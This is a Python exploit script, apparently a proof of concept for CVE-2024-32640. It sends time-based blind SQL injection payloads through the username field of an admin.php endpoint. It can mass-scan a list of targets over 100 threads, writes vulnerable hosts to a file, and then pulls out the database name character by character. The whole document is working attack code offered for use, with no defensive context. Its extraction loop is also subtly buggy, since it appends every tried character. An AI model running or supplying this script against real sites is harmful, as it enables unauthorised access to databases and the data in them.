import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
        "Connection": "keep-alive",
        "Content-Length": "77",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
    }
def exp(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target+url_payload
    len_dbmane = 1
    dbname = ''
    res1 = requests.get(target,verify=False) 
    if res1.status_code == 200:
        while len_dbmane <= 30:
            data=f"username=admin' AND (SELECT 12 FROM (SELECT(if(length(database())={len_dbmane},sleep(4),1)))ptGN) AND 'AAdm'='AAdm"           
            res2 = requests.post(url=url,headers=header,data=data,verify=False)
            time1 = res2.elapsed.total_seconds()
            len_dbmane+=1
            if time1 >= 4:
                print(f"length dbname is {len_dbmane-1}")
                break
        for i in range(1,len_dbmane):
            for j in range(32,127):
                data=f"username=admin' AND if((ascii(substr(database(),{i},1))={j}),sleep(5),0) AND 'AAdm'='AAdm"           
                res2 = requests.post(url=url,headers=header,data=data,verify=False)
                time1 = res2.elapsed.total_seconds()
                dbname+=chr(j)
                if time1 >= 4:
                    print(f"length dbname is {dbname}\n")
                    break                    
    else:
        print(f'该网站{target}可能存在问题，请手工测试')

def poc(target):
    url_payload = '/admin.php?controller=admin_commonuser'
    url = target+url_payload
    data="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm"
    data2="username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(1)))ptGN) AND 'AAdm'='AAdm"
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=header,data=data,verify=False)
        res3 = requests.post(url=url,headers=header,data=data2,verify=False)
        time1 = res2.elapsed.total_seconds()
        time2 = res3.elapsed.total_seconds()
        if time1 - time2 >= 3:
            print(f'[+]{target}存在延时注入')
            with open('result.txt','a') as f:
                f.write(target+'\n')
            return True
        else:
            print(f'[-]{target}不存在延时注入')
            return False
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        return False
def main():

    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()